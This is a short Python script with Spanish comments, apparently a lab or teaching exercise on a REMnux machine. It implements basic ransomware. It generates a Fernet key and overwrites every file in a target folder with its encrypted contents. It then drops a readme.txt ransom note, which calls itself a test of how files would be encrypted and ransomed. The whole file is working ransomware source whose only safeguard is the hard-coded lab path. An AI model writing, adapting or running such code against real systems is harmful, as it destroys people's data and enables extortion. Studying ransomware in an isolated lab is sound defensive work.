import imp
from importlib.resources import path
#Librerias de criptografia para el cifrado
from cryptography.fernet import Fernet
import os

#Funcion para generar la clave que cifrara los archivos 


def generar_llave():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


#En esta funcion vamos a cargar la llave

def cargar_llave():
    return open("key.key", "rb").read()
    
#Aqui encriptamos los archivos
def encriptar(items, key):
    #Aqui vamos a poner el metodo que ira encriptando los ficheros
    x = Fernet(key)
    #Aqui vamos a crear un bucle para que vaya recorriendo los elementos y mientras los 
    #vaya cifrando
    for item in items:
        with open(item, "rb") as file:
            file_data = file.read()
        encrypted_data = x.encrypt(file_data)
        with open(item, "wb") as file:
            file.write(encrypted_data)
            


if __name__ == "__main__":
    #Aqui es donde va el path de los ficheros a encriptar
    #||||||||[!!!!]MUCHO CUIDADO||||||||
    path_to_encrypt = "/home/remnux/Desktop/piton/archivos_ransomware"
    #Esta es la lista de archivos dentro del path donde hemos descargado el ransom
    items = os.listdir(path_to_encrypt)
    #Esto es una lista por compresion,es un bucle for que va a efectuar el cifrado en cada 
    #archivo del path
    full_path = [path_to_encrypt + "/" + item for item in items]



#Activamos las funciones

generar_llave()
key = cargar_llave()
#Con este metodo encriptamos con la llave cada uno de los archivos en el path
encriptar(full_path, key)

#Aqui vamos a poner el fichero donde pediremos el rescate
with open(path_to_encrypt + "/" + "readme.txt", "w") as file:
    file.write("Esto es una prueba de como te encriptarian los archivos y pedirian un rescate\n")